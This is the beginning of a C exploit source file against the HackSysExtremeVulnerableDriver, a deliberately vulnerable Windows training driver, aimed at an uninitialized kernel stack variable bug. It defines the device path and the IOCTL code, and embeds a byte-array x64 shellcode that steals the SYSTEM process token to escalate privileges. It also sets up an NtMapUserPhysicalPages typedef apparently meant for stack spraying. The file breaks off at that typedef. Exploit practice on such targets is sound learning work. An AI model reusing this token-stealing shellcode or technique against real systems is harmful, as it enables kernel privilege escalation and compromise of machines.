#include <Windows.h>
#include <stdio.h>

// These are our defined macros.
// The target device driver for this exploit is the HackSysExtremeVulnerableDriver, which is defined below.
#define DEVICE "\\\\.\\HackSysExtremeVulnerableDriver"
// This is the IO control code (IOCTL) that we need to send to our target device driver, to hit our code-path of choosing.
// In this case, this is the code-path we must take to exploit a kernel uninitialized stack variable bug.
#define TARGET_IOCTL 0x22202F

char unused = 0;

// Credit to xpnsec for providing a beautiful write-up on the HackSys Extreme Vulnerable Driver Stack-based Buffer Overflow on Windows 10 x64.
// Link: https://blog.xpnsec.com/hevd-stack-overflow/
char shellcode[99] = {
0x50, 0x53, 0x51, 0x56, 0x57, 0x65, 0x48, 0x8b, 0x04, 0x25,
0x88, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x80, 0x20, 0x02, 0x00,
0x00, 0x81, 0xb8, 0xe0, 0x02, 0x00, 0x00, 0x41, 0x41, 0x41,
0x41, 0x74, 0x0f, 0x48, 0x8b, 0x80, 0xe8, 0x02, 0x00, 0x00,
0x48, 0x2d, 0xe8, 0x02, 0x00, 0x00, 0xeb, 0xe5, 0x48, 0x89,
0xc3, 0x83, 0xb8, 0xe0, 0x02, 0x00, 0x00, 0x04, 0x74, 0x0f,
0x48, 0x8b, 0x80, 0xe8, 0x02, 0x00, 0x00, 0x48, 0x2d, 0xe8,
0x02, 0x00, 0x00, 0xeb, 0xe8, 0x48, 0x8b, 0x88, 0x58, 0x03,
0x00, 0x00, 0x48, 0x89, 0x8b, 0x58, 0x03, 0x00, 0x00, 0x5f,
0x5e, 0x59, 0x5b, 0x58, 0x48, 0x83, 0xc4, 0x28, 0xc3
};

struct INPUT_DATA
{
	unsigned long magic;
} _INPUT_DATA;

int main(int argc, char** argv);

// The definition for our NtMapUserPhysicalPages, that we will utilize in our actual exploit.
typedef NTSTATUS(*WINAPI NtMapUserPhysicalPages)(
	PVOID VirtualAddress,
	ULONG_PTR NumberOfPages,
	PULONG_PTR UserPfnArray
	);